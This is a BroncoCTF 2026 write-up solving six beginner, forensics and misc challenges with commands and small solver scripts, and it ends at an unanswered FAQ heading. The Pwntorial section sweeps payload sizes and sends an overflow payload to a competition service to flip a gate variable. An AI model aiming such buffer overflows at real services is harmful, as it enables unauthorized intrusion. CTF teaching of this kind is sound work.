---
title: "BroncoCTF 2026 Beginner + Forensics + Misc Writeup: 6 Solved"
slug: "broncoctf-2026-beginner-forensics-misc-writeup"
description: "BroncoCTF 2026 beginner + forensics + misc step-by-step: A/H binary decode, one-byte gate overflow, Krita bundle PNG zTXt, spot-diff insertion index, 1251-layer peel."
date: 2026-07-16T13:30:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["BroncoCTF 2026"]
tags:
  - "broncoctf"
  - "broncoctf 2026"
  - "bronco ctf"
  - "ctf writeup"
  - "beginner ctf"
  - "forensics"
  - "misc"
  - "osint"
  - "binary decode"
  - "buffer overflow gate"
  - "krita bundle"
  - "png ztxt chunk"
  - "diff insertion index"
  - "recursive archive peel"
  - "7z header encryption"
  - "file(1) libmagic"
  - "even-odd street numbering osint"
  - "two-symbol alphabet stego"
keywords:
  - "broncoctf 2026 beginner writeup"
  - "broncoctf 2026 forensics writeup"
  - "broncoctf 2026 misc writeup"
  - "digital crumbs osint writeup"
  - "no laughing matter binary writeup"
  - "pwntorial one-byte overflow writeup"
  - "bundle 99 krita png ztxt writeup"
  - "spot the difference insertion index writeup"
  - "zip zip hooray 1251 layer writeup"
  - "krita resource bundle forensics"
  - "7z content-only encryption filename leak"
  - "png ztxt zlib compressed text chunk"
  - "coffee mill oakland osint 3363 grand ave"
  - "a-h binary encoding beginner ctf"
  - "silent nc service one-byte gate variable"
toc: true
cover:
  image: "/images/articles/broncoctf-2026-beginner-forensics-misc-writeup.png"
  alt: "BroncoCTF 2026 beginner + forensics + misc writeup — six challenges solved covering an A/H binary-encoded file that decodes to more laughter, a silent nc service with a 76-byte buffer and a one-byte overflow into an adjacent gate variable, an OSINT photo of The Coffee Mill in Oakland with the pizza shop found via odd/even street numbering, a Krita resource bundle whose brush preset PNG carries a zTXt chunk with a kis_text_brush element hiding the flag, two files with a one-line insertion that misaligns a naive diff and hides the payload among case-flip decoys, and a 1251-layer archive stack cycling gzip / tar / bzip2 / 7z / zip whose per-layer 7z password is leaked by content-only encryption keeping filenames in the plaintext header"
---

BroncoCTF 2026 (bronco flag prefix, hosted by Santa Clara University's Cyber Security Club) rounds out its harder pwn/reverse/web/crypto tracks with three softer categories designed to teach one habit each — this **CyberSecurity Elite** beginner, forensics, and misc writeup walks all six challenges end to end. **Beginner** (three challenges) drills on the first-thirty-seconds reflexes: run `file(1)` before trusting the extension, notice when a file uses exactly two distinct symbols, sweep payload size against a silent nc service until you find the step function. **Forensics** (one challenge) walks a five-layer format staircase (Krita `.bundle` → `.kpp` (PNG) → `zTXt` chunk → zlib → XML → CDATA-wrapped XML → attribute) where every layer is a well-known standard on its own; the difficulty is only recognising they're stacked. **Misc** (two challenges) hides its payload behind a decoy: `Spot The Difference` uses a one-line insertion to misalign a naive line-by-line diff and case-flips as a Baconian red herring, while `Zip, Zip, Hooray!` wraps a flag in 1,251 recursive compression layers whose per-layer 7z password is *given away* by content-only encryption leaving filenames in the plaintext header.

Handouts, per-challenge READMEs, and pure-stdlib solver scripts live at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026). This writeup covers the three beginner challenges (Digital Crumbs, No Laughing Matter, Pwntorial), the one forensics challenge (Bundle 99), and the two misc challenges (Spot The Difference, Zip Zip Hooray). The paired [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) covers the harder Crab Trap / Proper Pwning / World's Hardestest Flag pwn set plus Cat Simulator / C++ Unplugged / Dog Simulator / Mirror Mirror on reverse, and the [BroncoCTF 2026 web + crypto writeup](/ctf-writeups/broncoctf-2026-web-crypto-writeup/) walks the SQLite LIKE injection, `robots.txt` leak, client-side auth trust, CSS-blur bypass, MD5 collision dispatcher, and 64-char keystring OTP.

## The six BroncoCTF 2026 beginner + forensics + misc challenges

| Challenge | Category | Bug class / primitive | Flag |
|---|---|---|---|
| Digital Crumbs | Beginner (OSINT) | Photo of The Coffee Mill in Oakland with the awning tagline "Oakland's Oldest Coffee House" (unique enough to pin the address 3363 Grand Ave in one search). US even/odd street numbering places the pizza shop across the street in the 3360s range: Domino's Pizza at 3360 Grand Ave. | `bronco{3360}` |
| No Laughing Matter | Beginner (misc) | Wall of `A` and `H` in 36 fixed 8-character groups. Two distinct symbols in fixed groups of 8 is unambiguously binary: `A → 0, H → 1` decodes to ASCII bytes. First byte `AHHAAAHA = 0x62 = 'b'` matches the `bronco{...}` prefix (correctness oracle). | `bronco{UFUNNYLMAOLOLXDIJBOLROFLHAHA}` |
| Pwntorial | Beginner (pwn) | Silent nc service. Payload-size sweep pinpoints a one-byte step at 76→77 bytes. Reconstructed C: 76-byte buffer + adjacent zero-initialised `gate` variable. 77 A's spill one byte into `gate`'s first byte, flipping it nonzero. Bytes 77-378 all work; 379+ clobbers the return address further up and suppresses the flag print. | `bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}` |
| Bundle 99 | Forensics | Extensionless `Bundle_99` is a Krita `.bundle` (zip with `mimetype = application/x-krita-resourcebundle`). Inner `paintoppresets/Brush 99.kpp` is a PNG whose `zTXt` chunk holds zlib-compressed brush preset XML. The XML carries a `kis_text_brush` element whose `text=` attribute is the flag (Krita's "type-a-word-and-paint-it-as-a-stroke" tool used as a hiding spot). | `bronco{1m4n4rt15ttru5t}` |
| Spot The Difference | Misc | Two files with ~one printable char per line. `wc -l` shows a one-line difference; the insertion at `f2[347]` misaligns a naive line-by-line diff and inflates diffs from 28 to 79, mixing alignment garbage with real payload. Score every candidate insertion index by exact-match count to recover offset 347, split remaining 79 diffs into case-only flips (Baconian decoy) vs. letter changes (28 real payload positions). | `bronco{y@yyy_Y0u_f0und_m3!!}` |
| Zip, Zip, Hooray! | Misc | `challenge.zip` is actually gzip (extension lies; `file(1)` names it). Recursive stack of 1,251 layers cycling `gzip → tar → bzip2 → 7z → zip` × 250. Each 7z is password-protected, but 7z's content-only encryption (`-p<pw>` without `-mhe=on`) leaves the filename table in the plaintext header, and the hint says "password is the first filename inside", so `7z l archive.7z` prints the password before you decrypt. Bash `while` loop dispatching on `file(1)` output peels the whole tower in ~3 minutes. | `bronco{i_h4te_f1l3_c0mpr3ssi0n}` |

The six challenges are pulled together by a single defensive theme: **the artefact tells you what to do if you use the right tool to look at it**. Digital Crumbs: `exiftool` first, then rank visible clues by uniqueness. No Laughing Matter: count distinct symbols and group length before reading the file as text. Pwntorial: sweep payload size for a step function before doing anything clever. Bundle 99: `file(1)` on any extensionless artefact, then walk PNG chunks past `IHDR/IDAT/IEND`. Spot The Difference: `wc -l` before `diff`. Zip Zip Hooray: `file(1)` over extension, and know your archive format's encryption mode (content-only vs. header-encrypted). Trained beginner-level triage is the entire skill this track is testing.

## Methodology — free tools before hard work

A pattern that worked on every challenge in this set: **run one triage command before you commit to any hypothesis**. `exiftool artifact.jpg | grep -Ei 'GPS|Model|Software'` takes one second and either hands you the answer (GPS coordinates) or tells you the location has to come from the pixels. `file(1)` on an extensionless or mis-extensioned file names the format exactly (`Zip data, MIME type "application/x-krita-resourcebundle"`) and often includes the original filename (`was "layer1.tar"`) as a bonus. `wc -l` catches a one-line insertion that would otherwise silently misalign a diff. `nc -v host port` followed by a short payload-size sweep pinpoints a buffer overflow's exact size in seconds. Walking a PNG's chunk list (16-byte header + `<length><type><data><crc>` records) reveals `zTXt`/`iTXt`/`tEXt`/`eXIf` payloads that `strings` won't necessarily catch because of zlib compression.

Beyond triage, the useful correctness-oracle habit is to **check the first decoded byte against the flag prefix** before committing to a mapping. For No Laughing Matter, decoding just `AHHAAAHA` under `A=0, H=1` yields `0x62 = 'b'`, which matches `bronco{...}`; the flipped mapping yields `0x9D`, which doesn't. Same logic applies to XOR keys, base-N alphabets, ROT-N variants, and any decoder with a small parameter space. You don't need to decode the whole file to know if your mapping is right.

Per-challenge walkthroughs follow.

## Beginner track

### 1. Digital Crumbs

A photo of a coffee shop with the question "what's the pizza shop across the street?" OSINT chain: EXIF check → landmark ID from the awning tagline → US street numbering to jump to the opposite side.

#### Step 1 — EXIF baseline

```
$ exiftool CoffeeMill.jpg | grep -Ei 'GPS|Model|Software'
$ # (no matches)
```

No GPS, no camera fingerprint. Location has to come from the pixels.

#### Step 2 — Rank visible clues by uniqueness

Skim the photo once and enumerate signal strength:

| Strength | Signal | Why it matters |
|---|---|---|
| High | Awning: "Oakland's Oldest Coffee House" | Marketing tagline unique enough to pin the business in one search. |
| High | A-frame sign: "THE COFFEE MILL" | Exact business name. |
| High | Filename `CoffeeMill.jpg` | Author confirmation. |
| Medium | Adjacent storefront: "V R DE / CLEANERS / SHIRTS LAUNDRY" | Verde Cleaners next door, useful for Street View corroboration. |
| Low | "ICE C…" sign | Coffee shop serves ice cream. Not location-diagnostic. |

The awning tagline `Oakland's Oldest Coffee House` is unique enough that one search resolves the address.

#### Step 3 — Identify the coffee shop

Search: `"The Coffee Mill" "Oakland's Oldest Coffee House"`. Yelp, LocalWiki, and Google Maps all agree:

> **The Coffee Mill & Bakery**, 3363 Grand Ave, Oakland CA 94610

Street View corroborates: same maroon awning, same white lattice patio railing, same Verde Cleaners immediately to the right.

#### Step 4 — Jump across the street with US numbering

American street numbering places odd numbers on one side of the street and even on the other, monotonically increasing along the block. `3363` is odd, so "across the street" means the even side in the same block: the `3360`s range.

One search: `pizza "Grand Avenue" Oakland near 3363`. Top hit: **Domino's Pizza, 3360 Grand Ave, Oakland CA**. Zachary's Pizza sits way up at `3917`, Round Table down at `398`; `3360` is unambiguous.

Flag: `bronco{3360}`.

Per-challenge README + solver: [beginner/digital-crumbs](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/beginner/digital-crumbs).

The generalisable OSINT lesson: on any image challenge, `exiftool` first (one second, often ends the challenge if GPS is present), then rank visible clues by *uniqueness before you search*. A marketing tagline like `Oakland's Oldest Coffee House` is worth ten generic phrases like `coffee mill`. And US even/odd street numbering is a stable primitive: when the prompt says "across the street", you can derive the target address arithmetically without needing to open Street View.

### 2. No Laughing Matter

A file that looks like typed-out laughter. Two distinct symbols in fixed groups of 8 is unambiguously binary.

#### Step 1 — Look at the shape, not the letters

```
$ file aha.txt
aha.txt: ASCII text, with very long lines (323), with no line terminators
$ head -1 aha.txt
AHHAAAHA AHHHAAHA AHHAHHHH AHHAHHHA AHHAAAHH AHHAHHHH AHHHHAHH AHAHAHAH ...
```

Three signals override the "this is written laughter" reading:

- Every group is **exactly 8 chars** (chat laughter isn't length-regular).
- Alphabet is **exactly 2 symbols** (real laughter uses `a`, `h`, `H`, `!` mixed).
- 36 × 8-bit groups = **36 bytes**, right in the range for a CTF flag body.

Two symbols in fixed 8-char groups is a binary encoding.

#### Step 2 — Confirm the mapping with the flag prefix

Two candidates: `A=0, H=1` or `A=1, H=0`. Try alphabetical (`A=0, H=1`) first and decode just the first group:

```
A H H A A A H A
0 1 1 0 0 0 1 0   = 0x62 = 'b'
```

Matches the `bronco{...}` prefix. Locked in.

#### Step 3 — Decode the whole file

```python
s = open('aha.txt').read().split()
print(''.join(chr(int(g.replace('A','0').replace('H','1'), 2)) for g in s))
# bronco{UFUNNYLMAOLOLXDIJBOLROFLHAHA}
```

Body reads as `U FUNNY, LMAO, LOL, XD, IJBOL, ROFL, HAHA`, a solid wall of chat-shorthand laughter reactions. The file was shaped like laughter, and decodes to more laughter. The author's flavour text ("You see, that's not funny") is doing double duty: it names the punchline, and it hints that what you see isn't literal laughter.

Per-challenge README + solver: [beginner/no-laughing-matter](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/beginner/no-laughing-matter).

Two generalisable habits. **A two-symbol alphabet is almost always binary.** Once you notice a file uses exactly two distinct characters, the next question is the group length: 8 → ASCII bytes, 5 → Baconian, 6 → base-64 glyphs, 7 → 7-bit ASCII. Don't fixate on *what* the symbols are (`A`/`H`, `.`/`-`, `T`/`F`, dolphin whistles); alphabet *size* is what matters. **The CTF prefix is a free correctness oracle.** Decode just the first byte under a candidate mapping and check it against the expected prefix (`b` for BroncoCTF, `L` for LYKN, `g` for grodno, etc.). One right byte confirms the mapping; one wrong byte means flip and retry. You never have to guess-and-check the whole file.

### 3. Pwntorial

A silent nc service. Payload-size sweep pinpoints a one-byte cliff at 76→77 that flips a gate variable adjacent to a 76-byte buffer.

#### Step 1 — Silent doesn't mean broken

```
$ nc -v 0.cloud.chals.io 19476
Connection succeeded!
(no output)
```

`openssl s_client` returns "wrong version number": endpoint is plain TCP, not TLS. `snicat broncoctf-pwntorial.chals.io` is just the chals.io ingress routing. Type anything and the service wakes up:

```
$ printf 'hi\n' | nc -w 3 0.cloud.chals.io 19476
[-] Try again. The gate is still closed.
```

Protocol: one line in, one status line back, close. Silent on connect means "waiting for you to speak first," not broken.

#### Step 2 — Sweep payload size

The response `gate is still closed` is a boolean-shaped check. Cheapest hypothesis: unbounded read into a stack buffer, adjacent gate variable, one byte of overflow flips it. Test with a sweep:

```
sz=70..76 → closed
sz=77..378 → OPEN + flag
sz=379+ → OPEN, flag suppressed
```

Two cliffs. Lower cliff at 76→77 is one byte wide → 76-byte buffer with a zero-initialised `gate` variable starting at offset 76.

#### Step 3 — Reconstruct the C

```c
struct {
    char buf[76];
    unsigned long gate;   // initially 0
} state = {0};

read_a_line(state.buf);     // no bounds check (gets / scanf %s / read)

if (state.gate) {
    puts("[+] SUCCESS! Welcome inside, aspiring pwner!");
    print_flag();
} else {
    puts("[-] Try again. The gate is still closed.");
}
```

76 A's fill the buffer, then either the trailing NUL (`gets`/`scanf`) or nothing (`read(2)`) lands on `gate[0]`, keeping it zero. 77 A's put `'A' = 0x41` at `gate[0]`, making `gate == 0x0000000000000041`, which is nonzero → flag prints.

The upper cliff at 379 (flag print gets suppressed) is the saved return address further up the stack getting clobbered: the SUCCESS print completes, but the process crashes before the flag print runs. Corollary: when a ret2win-style exploit works but a follow-up print doesn't, look at what's past the buffer you thought you were staying inside of.

#### Step 4 — Fire

```python
import socket
s = socket.create_connection(('0.cloud.chals.io', 19476))
s.sendall(b'A' * 80 + b'\n')
print(s.recv(4096).decode())
# [+] SUCCESS! Welcome inside, aspiring pwner!
# bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}
```

Per-challenge README + solver: [beginner/pwntorial](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/beginner/pwntorial).

Three portable lessons. **A silent service is a protocol, not a bug.** If the server doesn't greet you, it's expecting you to speak first, and a "wrong version number" from a TLS probe is *positive evidence* the endpoint isn't TLS. **Sweep payload size before doing anything clever.** N bytes → response, plotted against N, gives a step function whose location names the buffer size and whose width names the overflow requirement (one byte vs. eight, null-terminated vs. not). **Overshooting has costs.** Once you have a working payload, tighten it; extra bytes past the minimum often smash primitives (return addresses, function pointers) you didn't know you had. This is the miniature version of "your ROP chain works but only the first gadget fires."

## Forensics track

### 4. Bundle 99

A five-layer format staircase. Every layer is a well-known standard on its own; the challenge is recognising they're stacked.

#### Step 1 — `file(1)` the mystery blob

```
$ file Bundle_99
Bundle_99: Zip data (MIME type "application/x-krita-resourcebundle"?)
```

libmagic names the exact format: **Krita resource bundle**, ODF-style zip that Krita uses to distribute brushes / patterns / palettes. Rename `Bundle_99.bundle` and unzip:

```
$ unzip -l Bundle_99
   19143  paintoppresets/Brush 99.kpp
   62913  preview.png
     436  META-INF/manifest.xml
     907  meta.xml
      34  mimetype
```

Preview PNG is unremarkable (crying-laughing emoji). `meta.xml` is a joke Dublin-Core (`99 bundles of brushes on the wall...`). The story is in `paintoppresets/Brush 99.kpp`.

#### Step 2 — `.kpp` is another PNG

```
$ file 'paintoppresets/Brush 99.kpp'
paintoppresets/Brush 99.kpp: PNG image data, 200 x 200, 8-bit/color RGBA, non-interlaced
```

Krita brush presets are stored as PNGs: the image is the thumbnail, the preset parameters live in an ancillary chunk. Walking the chunk list:

```python
'IHDR' len=13
'pHYs' len=9
'zTXt' len=1650     ← ancillary compressed text — the payload
'tEXt' len=11
'IDAT' len=8192
'IDAT' len=8192
'IDAT' len=972
'IEND' len=0
```

`IDAT` = pixel data. `tEXt` at the end is a Krita version tag. The `zTXt` at 1650 bytes is 1.6 KB of zlib-compressed text hanging off the front; that's the preset XML.

#### Step 3 — Unwrap the `zTXt`

PNG `zTXt` chunk layout: `<keyword>\x00<method:1><zlib_deflated_data>` where method 0 = deflate. Extract and inflate:

```python
import struct, zlib
d = open('Brush 99.kpp', 'rb').read()[8:]
while d:
    L = struct.unpack('>I', d[:4])[0]
    t, c = d[4:8], d[8:8+L]
    if t == b'zTXt':
        kw, _, rest = c.partition(b'\x00')
        xml = zlib.decompress(rest[1:]).decode()
        break
    d = d[8+L+4:]
# 16.6 KB of preset XML labelled 'preset'
```

#### Step 4 — Read the preset

Buried around offset 15,000 in the preset XML:

```xml
<param name="brush" type="string">
  <![CDATA[
    <Brush spacing="0.1" ... type="kis_text_brush" BrushVersion="2"
           text="bronco{1m4n4rt15ttru5t}"/>
  ]]>
</param>
```

`kis_text_brush` is Krita's "type text and paint it as a brushstroke" tool. The `text=` attribute is whatever glyphs would get stamped when you paint with this brush. The author used it as a hiding spot: painting a stroke with this preset would literally inscribe the flag on the canvas.

Or skip the pipeline entirely:

```
$ grep -oE 'bronco\{[^"}]+\}' preset.xml
bronco{1m4n4rt15ttru5t}
```

Body reads as `im an artist trust`: the artist's appeal to trust, encoded inside their own tool.

Per-challenge README + solver: [forensics/bundle-99](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/forensics/bundle-99).

Three portable lessons. **`file(1)` before assumptions**: a file with no extension is exactly the case libmagic is designed to handle, and its answer often includes the specific *application* format ("Krita resource bundle") not just the container ("zip"). **PNG has ancillary chunks and forensics loves them**: `tEXt` (plain), `iTXt` (internationalised), `zTXt` (compressed), `eXIf` (exif), plus non-standard vendor chunks are all data-carrying. Walk the chunk list before touching pixels. **File formats nest**: `bundle → preset → PNG → zTXt → zlib → XML → CDATA → attribute` is six layers deep, but each layer is a well-known standard. Peel one layer at a time; spelunking from the outside makes it look impossible.

## Misc track

### 5. Spot The Difference

Two files, ~one printable char per line. `wc -l` shows a one-line difference; the insertion misaligns a naive diff and hides the payload among case-flip decoys.

#### Step 1 — `wc -l` first

```
$ wc -l -c artifacts/file1.txt artifacts/file2.txt
  350   700 file1.txt
  351   702 file2.txt
```

**One-line difference**. That's the whole trick right there, but easy to miss because `diff -y` doesn't shout about it.

#### Step 2 — Naive line-by-line diff (the wrong first move)

```python
f1 = open('file1.txt').read().splitlines()
f2 = open('file2.txt').read().splitlines()
diffs = [(i, a, b) for i, (a, b) in enumerate(zip(f1, f2)) if a != b]
print(len(diffs), 'diffs')  # 79
```

79 differences on a 10-point misc feels off. Reading `file2`'s bytes at those 79 positions gives:

```
ECbrhPwoWlIlnwfecDoUmg{yvj@YaycyyZx_dlYI0vu_ffx0SuGOmiYnKsduvU_ZJmhtg3i!!YiPV}[
```

The flag body is visible in the middle (`{...}`, `Y0u_f0und_m3!!`, `}`), but there's a lot of junk mixed in. That's alignment drift past the insertion.

#### Step 3 — Find the insertion index by scoring matches

Rather than eyeball where the extra line is, score every candidate insertion index by how many exact matches it produces:

```python
best = (0, -1)
for i in range(len(f2)):
    matches = sum(1 for j in range(len(f1))
                  if f1[j] == f2[j if j < i else j + 1])
    if matches > best[0]:
        best = (matches, i)
print(best)  # (272, 347)
```

Winner: dropping `f2[347]` (character `V`) lifts exact-match count from ~270 to 272. Case-insensitive match count is stable at 322. With this offset applied, real diffs collapse from 79 to **28**.

#### Step 4 — Case flips are a Baconian red herring

Of the 79 original diffs, 51 are pure case flips (`e↔E`, `H↔h`, `p↔P`). That's Baconian-cipher territory (5-bit `A/B` groups → 10 letters), and 50 bits is a suspicious length. But decoding either polarity produces `FLZ?XOGOHU` or `?UGCIRZRYK`, plainly garbage. The case flips are a decoy meant to slow you down.

The 28 actual letter-change positions carry the payload. Concatenate `file2`'s character at each:

```
bronco{y@yyy_Y0u_f0und_m3!!}
```

Body reads as *"yayyy! You found me!!"*, the friend celebrating the decode.

Per-challenge README + solver: [misc/spot-the-difference](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/misc/spot-the-difference).

Three portable habits. **`wc -l` before `diff`**: a one-off length delta is invisible in casual `diff` output but silently misaligns everything from the insertion point. Here it nearly tripled the diff count (28 → 79) and mixed alignment noise into real payload. **Case flips as first-pass decoy**: fifty case-only diffs feels purposeful and invites you to decode a Baconian cipher that isn't there. Try the letter-change payload first; fall back to Baconian only if that's empty. **The extraction is the flag**: when your recovered plaintext already has the shape `<word>{<body>}`, submit verbatim. Don't rewrap it in a flag prefix you're used to; the `<word>` is the CTF's format.

### 6. Zip, Zip, Hooray!

`challenge.zip` is not a zip. It's a 1,251-layer archive stack cycling five formats. Every 7z is password-protected but its password is `7z l`-visible because content-only encryption leaves filenames in the plaintext header.

#### Step 1 — The extension lies

```
$ unzip challenge.zip
End-of-central-directory signature not found.
$ file challenge.zip
challenge.zip: gzip compressed data, was "layer1.tar", ..., original size 481280
```

libmagic names the truth and hands you the original name (`layer1.tar`) as a bonus.

#### Step 2 — Peel one full cycle by hand

```
challenge.zip (gzip, was layer1.tar)
  → layer1.tar (POSIX tar)
    → layer2.bz2 (bzip2)
      → layer2 (7-zip archive)
        → layer4.zip (Zip archive)
```

Five formats: `gzip → tar → bzip2 → 7z → zip`. The `layer_N` counter jumps by 4 per cycle (`layer1 → layer4 → layer5 → layer8 → layer9 → ...`).

#### Step 3 — Why the 7z password is a free variable

The hint says "password is the name of the first file inside." That only *works* because 7z supports two encryption modes:

- **Content-only** (`-p<pw>` alone): AES-256 encrypts file contents, but the archive header (including the filename table) stays plaintext. `7z l archive.7z` prints every entry's name/size/timestamp without prompting.
- **Full header encryption** (`-p<pw> -mhe=on`): header encrypted too, `7z l` prompts for the password.

The author picked mode #1. So the password is readable *before* decryption:

```
$ 7z l layer2
   Date      Time    Attr         Size  Name
------------------- ----- ------------  ---------------
2026-02-28 04:39:51 ....A       466424  layer4.zip
$ 7z x layer2 -player4.zip -o L3
```

If they'd flipped on `-mhe=on`, the hint would be a paradox and the challenge would be unsolvable as written.

#### Step 4 — Automate

```bash
while :; do
    kind=$(file -b current.bin)
    case "$kind" in
        gzip*)         gunzip -c current.bin > tmp && mv tmp current.bin ;;
        bzip2*)        bunzip2 -c current.bin > tmp && mv tmp current.bin ;;
        "POSIX tar"*)  tar -xf current.bin -C d && mv d/* current.bin ;;
        "Zip archive"*) unzip -oq current.bin -d d && mv d/* current.bin ;;
        "7-zip archive"*)
            pw=$(7z l -slt current.bin | awk -F'= ' '/^Path = /{print $2}' | sed -n '2p')
            7z x current.bin -p"$pw" -od -y >/dev/null && mv d/* current.bin
            ;;
        *) break ;;   # not an archive → we're done
    esac
done
```

The one subtle bit: `sed -n '2p'` when parsing `7z l -slt`. The first `Path = ...` record refers to the archive itself; the first *entry* filename is the second `Path` record.

Run against the handout:

```
=== layer 1251 :: ASCII text, with no line terminators
=== leaf reached after 1251 layers ===
size: 31 bytes
bronco{i_h4te_f1l3_c0mpr3ssi0n}
```

Exactly 250 of each of the five recurring formats (`250 * 5 = 1250` archive layers + 1 text leaf), which confirms the "script that got a little carried away" was a clean 250-iteration for-loop. Runtime end-to-end: ~3 minutes.

Per-challenge README + solver: [misc/zip-zip-hooray](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/misc/zip-zip-hooray).

Three portable takeaways. **Trust `file(1)` over extensions**: any time a challenge hands you one file and the first thing you try refuses it, `file(1)` is the next question. **Password hints smuggle in assumptions about encryption mode**: "password is the first filename" only works because 7z didn't turn on header encryption. Same class of observation applies to zip's traditional (weak) encryption (also leaves filenames plaintext) versus AE-2 (which typically doesn't). **When the challenge story mentions "a script that got carried away", write the reverse**: once you've peeled one cycle by hand and confirmed regularity, doing another layer manually returns zero. Reach for the loop.

## Cross-cutting defender notes

Six patterns recur across the BroncoCTF 2026 beginner + forensics + misc tracks and translate directly into review or triage heuristics.

**`file(1)` before extension.** Half of these challenges (Bundle 99, Zip Zip Hooray, and implicitly Digital Crumbs when the JPEG is stripped) turn on running libmagic first. Extensions are hints, not truth. The command is one line, the output often names the exact application format (`application/x-krita-resourcebundle`, `gzip compressed data, was "layer1.tar"`), and it's the difference between five minutes of "why won't unzip open this" and thirty seconds to the next layer.

**Sweep payload size against silent services.** Pwntorial's exploit is entirely in the diagnostic: N bytes → response, plot against N, look for a step function. Location of the step names the buffer size; width of the step names the overflow requirement (one byte for null-terminated reads like `gets`/`scanf %s`, or spilling multiple bytes for `read(2)`). This applies to any service where you don't have source: HTTP body length limits, WebSocket frame handlers, RPC deserialisers, TLS record parsers.

**Two-symbol alphabet + fixed group length = binary.** No Laughing Matter's `A`/`H` in 8-char groups is the canonical case. Same shape applies to `T`/`F`, `0`/`1`, `.`/`-` (Morse), tabs/spaces (whitespace stego), uppercase/lowercase per letter (Baconian, but 5-bit groups), pixel values 0/1 in an image. Once you notice the alphabet size, the next question is *group length*: 5 → Baconian, 6 → base-64 glyphs, 7 → 7-bit ASCII, 8 → bytes.

**`wc -l` before `diff`.** A one-line insertion is invisible in casual `diff` output but silently misaligns everything past the insertion point. On Spot The Difference the mis-alignment nearly tripled the diff count (28 → 79) and mixed alignment noise into real payload characters. Anytime you're diffing two files that should be "the same shape but slightly different", `wc -l` first; if the counts differ, use `git diff --diff-algorithm=histogram` or a manual insertion-index scan before trusting a naive `zip()` walk.

**PNG has ancillary chunks and they carry data.** Anything past `IHDR` / `IDAT` / `IEND` on a PNG from a non-camera source is worth walking: `tEXt` (plain), `iTXt` (internationalised), `zTXt` (zlib-compressed), `eXIf` (exif), plus vendor chunks like `vpAg`. `strings` will surface `tEXt` and `iTXt` but *not* `zTXt` (deflated), so a chunk walker is a strictly better forensic tool. Same class of hiding spot exists in every container format with an extensibility slot: ID3 tags in MP3, EXIF/XMP in JPEG, comment records in PDF, custom XML parts in DOCX, private-use Unicode code points in text files.

**Encryption modes matter.** Zip Zip Hooray's "password is the first filename" works because 7z's content-only encryption leaves filenames plaintext; full header encryption (`-mhe=on`) would make the hint paradoxical. Same distinction applies to zip's traditional weak encryption (filename table plaintext) vs. AE-2 (typically not). When triaging a password-protected archive, `<tool> l` first: if it lists contents without prompting, the header isn't encrypted, and any hint that reads content from the archive is a valid oracle.

## Frequently asked questions

### What is BroncoCTF 2026?

BroncoCTF is a jeopardy-style Capture-The-Flag competition run by Santa Clara University's Cyber Security Club (the "Broncos"). The 2026 edition ran categories including beginner, crypto, forensics, misc, pwn, reverse, and web, with challenges from 10 points (easy warmups) up to a few hundred points (harder chains). Flag format: `bronco{...}`. This writeup covers three beginner challenges (Digital Crumbs, No Laughing Matter, Pwntorial), one forensics challenge (Bundle 99), and two misc challenges (Spot The Difference, Zip Zip Hooray). The paired [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) and [BroncoCTF 2026 web + crypto writeup](/ctf-writeups/broncoctf-2026-web-crypto-writeup/) cover the rest. Per-challenge READMEs and solvers at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026).

### How do you solve Digital Crumbs OSINT without GPS EXIF?

`exiftool` shows the JPEG has no GPS, no camera fingerprint. Location has to come from the pixels. Rank visible clues by uniqueness: the awning tagline "Oakland's Oldest Coffee House" is a specific enough marketing phrase that searching for it (with the business name from the A-frame sign, "The Coffee Mill") pins the address in one hit: 3363 Grand Ave, Oakland CA. US even/odd street numbering places the pizza shop across the street in the same block's 3360s range: Domino's Pizza at 3360 Grand Ave. Flag: `bronco{3360}`.

### How is the No Laughing Matter file encoded?

The file uses exactly two symbols (`A` and `H`) in 36 fixed 8-character groups. Two symbols in fixed 8-char groups is unambiguously binary; the only question is which symbol is `0` and which is `1`. Try `A=0, H=1` (alphabetical) first and decode just the first group: `AHHAAAHA = 01100010 = 0x62 = 'b'`. That matches the `bronco{...}` flag prefix, so the mapping is confirmed without decoding the whole file. Full decode: `bronco{UFUNNYLMAOLOLXDIJBOLROFLHAHA}`. The body is a wall of chat-shorthand laughter reactions, so the file both *looks* like laughter and *decodes* to more laughter.

### Why does Pwntorial's exploit work at exactly 77 bytes?

Payload-size sweep shows a one-byte transition between 76 (closed) and 77 (open). Reconstructed C: a 76-byte stack buffer immediately followed by a zero-initialised `gate` variable, filled by a read function without bounds check (`gets`, `scanf %s`, or `read(2)`). 76 A's exactly fill the buffer and either the read function's trailing NUL or nothing lands on `gate[0]`, leaving `gate == 0`. 77 A's spill one byte into `gate[0]`, making `gate == 0x41` (nonzero), which passes the `if (gate)` check and prints the flag. Payloads from 77-378 bytes all work; 379+ clobbers the saved return address further up the stack and suppresses the flag print, which is the miniature version of "your ROP chain works but the second gadget dies because you smashed something the first gadget didn't touch."

### What are the six layers inside the Bundle 99 forensics artefact?

Six layers deep, every one a well-known standard: (1) `Bundle_99` is a zip with `mimetype = application/x-krita-resourcebundle`, i.e. a Krita resource bundle; (2) inside sits `paintoppresets/Brush 99.kpp` which is itself a PNG; (3) that PNG's chunk list includes a `zTXt` (zlib-compressed text) chunk labelled `preset`; (4) inflating it yields ~16 KB of XML; (5) around offset 15,000 a `<param name="brush">` element wraps another XML fragment in CDATA; (6) inside that fragment a `<Brush type="kis_text_brush" text="bronco{1m4n4rt15ttru5t}"/>` element carries the flag. `kis_text_brush` is Krita's "type text and paint it as a brushstroke" tool. The `text=` attribute is what would get stamped when painting with this brush.

### How does the Spot The Difference insertion index scoring work?

